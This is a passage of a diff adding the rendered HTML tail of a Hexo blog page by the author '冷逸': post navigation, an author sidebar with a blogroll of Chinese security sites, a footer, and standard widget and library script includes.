+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/exec/" rel="next" title="聊一聊代码、命令执行">
+                <i class="fa fa-chevron-left"></i> 聊一聊代码、命令执行
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/st/" rel="prev" title="匿...">
+                匿... <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.screenshot.net/9zoe9ax"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">62</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">91</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
